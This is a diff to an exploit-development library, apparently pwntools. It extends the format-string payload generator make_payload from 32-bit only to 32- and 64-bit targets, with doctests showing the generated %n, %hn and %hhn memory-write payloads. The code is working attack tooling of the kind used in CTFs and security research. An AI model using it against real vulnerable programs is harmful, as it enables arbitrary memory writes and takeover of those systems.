@@ -54,48 +54,67 @@ from pwnlib.util.packing import *
 
 log = getLogger(__name__)
 
-def make_payload(offset, writes, numbwritten=0, nformater=4):
-    """make_payload(offset, writes, numbwritten=0, nformater=4) -> str
+def make_payload(offset, writes, numbwritten=0, write_size='byte'):
+    """make_payload(offset, writes, numbwritten=0, write_size='byte') -> str
 
-    Makes payload with given parametersself.
+    Makes payload with given parameter.
+    It can generate payload for 32 or 64 bits architectures. 
+    The size of the addr is taken from ``context.bits``
 
     Arguments:
         offset(int): the first formatter's offset you control
         writes(list): list of tuple, each tuple must be composed as ``(where, what)``
         numbwritten(int): number of byte already written by the printf function
-        nformater(int): must be 4, 2 or 1. Tells if you want to write byte by byte, short by short or directly an int
+        write_size(str): must be 'byte', 'short', 'int'. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
 
     Returns:
         The payload in order to do needed writes
 
     Examples:
-        >>> fmtstr.make_payload(1, [(0x0, 0x1337babe)])
-        '\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn'
-        >>> fmtstr.make_payload(1, [(0x0, 0x1337babe)], nformater=2)
-        '\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00%47798c%1$hn%22649c%2$hn'
-        >>> fmtstr.make_payload(1, [(0x0, 0x1337babe)], nformater=1)
+        >>> with context.local(arch = 'amd64'):
+        ...     print repr(fmtstr.make_payload(1, [(0x0, 0x1337babe)], write_size='int'))
+        ...     print repr(fmtstr.make_payload(1, [(0x0, 0x1337babe)], write_size='short'))
+        ...     print repr(fmtstr.make_payload(1, [(0x0, 0x1337babe)], write_size='byte'))
+        ... 
+        '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00%322419374c%1$n%3972547906c%2$n'
+        '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00%47774c%1$hn%22649c%2$hn%60617c%3$hn%4$hn'
+        '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00%126c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn%237c%5$hhn%6$hhn%7$hhn%8$hhn'
+        >>> with context.local(arch = 'i386'):
+        ...     print repr(fmtstr.make_payload(1, [(0x0, 0x1337babe)], write_size='int'))
+        ...     print repr(fmtstr.make_payload(1, [(0x0, 0x1337babe)], write_size='short'))
+        ...     print repr(fmtstr.make_payload(1, [(0x0, 0x1337babe)], write_size='byte'))
+        ... 
         '\\x00\\x00\\x00\\x00%322419386c%1$n'
+        '\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00%47798c%1$hn%22649c%2$hn'
+        '\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn'
 
     """
 
-    for where, what in writes:
-        if where > 0xFFFFFFFF or what > 0xFFFFFFFF or context.bits != 32:
-            log.error("can only build 32bits arch payload...")
+    # 'byte': (number, step, mask, format, decalage)
+    config = {
+                32 : {'byte': (4, 1, 0xFF, 'hh', 8),
+                      'short': (2, 2, 0xFFFF, 'h', 16),
+                      'int': (1, 4, 0xFFFFFFFF, '', 32)},
+                64 : {'byte': (8, 1, 0xFF, 'hh', 8),
+                      'short': (4, 2, 0xFFFF, 'h', 16),
+                      'int': (2, 4, 0xFFFFFFFF, '', 32)}
+            }
 
-    if nformater not in [1, 2, 4]:
-        log.error("nformater must be 1, 2 or 4")
+    if write_size not in ['byte', 'short', 'int']:
+        log.error("write_size must be 'byte', 'short' or 'int'")
+
+    number, step, mask, formatz, decalage = config[context.bits][write_size]
 
     # add wheres
     payload = ""
     for where, what in writes:
-        for i in range(0, 4, 4/nformater):
+        for i in range(0, number*step, step):
             payload += pack(where+i)
 
     numbwritten += len(payload)
-    mask = int(4/nformater * "FF", 16)
     fmtCount = 0
     for where, what in writes:
-        for i in range(0, 4, 4/nformater):
+        for i in range(0, number):
             current = what & mask
             if numbwritten & mask <= current:
                 to_add = current - (numbwritten & mask)
@@ -104,10 +123,10 @@ def make_payload(offset, writes, numbwritten=0, nformater=4):
 
             if to_add != 0:
                 payload += "%%%dc" % to_add
-            payload += "%%%d$%sn" % (offset + fmtCount, nformater/2 * "h")
+            payload += "%%%d$%sn" % (offset + fmtCount, formatz)
 
             numbwritten += to_add
-            what >>= 4/nformater*8
+            what >>= decalage
             fmtCount += 1
 
     return payload
@@ -207,7 +226,7 @@ class FmtStr(object):
 
         """
         fmtstr = randoms(self.padlen)
-        fmtstr += make_payload(self.offset, self.writes, numbwritten=self.padlen, nformater=4)
+        fmtstr += make_payload(self.offset, self.writes, numbwritten=self.padlen, write_size='byte')
         self.execute_fmt(fmtstr)
         self.writes = []
 
